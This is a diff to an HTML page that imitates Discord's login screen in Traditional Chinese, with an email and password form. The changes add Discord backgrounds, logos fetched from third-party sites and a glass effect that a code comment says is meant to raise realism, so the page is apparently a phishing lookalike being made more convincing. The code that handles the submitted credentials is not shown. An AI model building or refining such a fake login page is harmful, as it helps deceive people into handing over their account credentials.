@@ -5,28 +5,119 @@
   <title>Discord - 登入</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
-    body { margin:0; background:#36393f; font-family:'gg sans',sans-serif; height:100vh; display:flex; align-items:center; justify-content:center; color:#dcddde; }
-    .container { width:440px; background:#36393f; padding:40px; border-radius:5px; box-shadow:0 2px 10px rgba(0,0,0,.4); }
-    .logo { text-align:center; margin-bottom:30px; }
-    .logo img { width:80px; }
-    h1 { font-size:24px; text-align:center; margin:0 0 8px; color:#fff; }
-    .sub { text-align:center; color:#b9bbbe; margin-bottom:30px; }
-    label { display:block; margin-bottom:8px; color:#b9bbbe; font-weight:600; font-size:14px; }
-    input { width:100%; padding:10px; margin-bottom:20px; background:#202225; border:1px solid #202225; border-radius:3px; color:#fff; font-size:16px; box-sizing:border-box; }
-    input:focus { border-color:#5865f2; outline:none; box-shadow:0 0 0 2px rgba(88,101,242,.3); }
-    button { width:100%; padding:12px; background:#5865f2; color:#fff; border:none; border-radius:3px; font-size:16px; cursor:pointer; }
-    button:hover { background:#4752c4; }
-    .footer { text-align:center; margin-top:20px; font-size:12px; color:#72767d; }
-    .footer a { color:#00aff4; text-decoration:none; }
+    body {
+      margin: 0;
+      height: 100vh;
+      background: url('https://discord.com/assets/d8680b1c1576ecc8.svg') no-repeat center center fixed;
+      background-size: cover;
+      font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      color: #dcddde;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .logo-top-left {
+      position: fixed;
+      top: 20px;
+      left: 20px;
+      z-index: 10000;
+    }
+    .logo-top-left img {
+      width: 60px;
+      height: auto;
+    }
+    .container {
+      width: 440px;
+      background: rgba(54, 57, 63, 0.85); /* 半透明背景，避免與背景圖衝突 */
+      padding: 40px;
+      border-radius: 5px;
+      box-shadow: 0 2px 10px rgba(0,0,0,.4);
+      backdrop-filter: blur(5px); /* 玻璃效果，提升真實感 */
+    }
+    .logo-center {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    .logo-center img {
+      width: 80px;
+    }
+    h1 {
+      font-size: 24px;
+      text-align: center;
+      margin: 0 0 8px;
+      color: #fff;
+    }
+    .sub {
+      text-align: center;
+      color: #b9bbbe;
+      margin-bottom: 30px;
+      font-size: 16px;
+    }
+    label {
+      display: block;
+      margin-bottom: 8px;
+      color: #b9bbbe;
+      font-size: 14px;
+      font-weight: 600;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 20px;
+      background: #202225;
+      border: 1px solid #202225;
+      border-radius: 3px;
+      color: #fff;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    input:focus {
+      outline: none;
+      border-color: #5865f2;
+      box-shadow: 0 0 0 2px rgba(88,101,242,.3);
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #5865f2;
+      color: #fff;
+      border: none;
+      border-radius: 3px;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background .2s;
+    }
+    button:hover {
+      background: #4752c4;
+    }
+    .footer {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 12px;
+      color: #72767d;
+    }
+    .footer a {
+      color: #00aff4;
+      text-decoration: none;
+    }
+    .footer a:hover {
+      text-decoration: underline;
+    }
   </style>
 </head>
 <body>
+  <!-- 左上角 Discord Logo -->
+  <div class="logo-top-left">
+    <img src="https://logos-world.net/wp-content/uploads/2020/11/Discord-Logo-2021-Present.png" alt="Discord Logo">
+  </div>
+
   <div class="container">
-    <div class="logo">
+    <div class="logo-center">
       <img src="https://assets-global.website-files.com/6257adef93867e50d84d30e2/6257d3a0e8b7d6b0c0e6f6d2_discord-logo-wordmark-color-white.svg" alt="Discord">
     </div>
     <h1>歡迎回來！</h1>
-    <div class="sub">很高興再次見到你</div>
+    <div class="sub">我們很高興又見到您了！</div>
     
     <form id="f">
       <label>電子郵件或電話號碼</label>
@@ -38,7 +129,7 @@
     
     <div class="footer">
       <a href="#">忘記密碼？</a><br>
-      需要帳號？<a href="#">註冊</a>
+      需要帳號？ <a href="#">註冊</a>
     </div>
   </div>
 
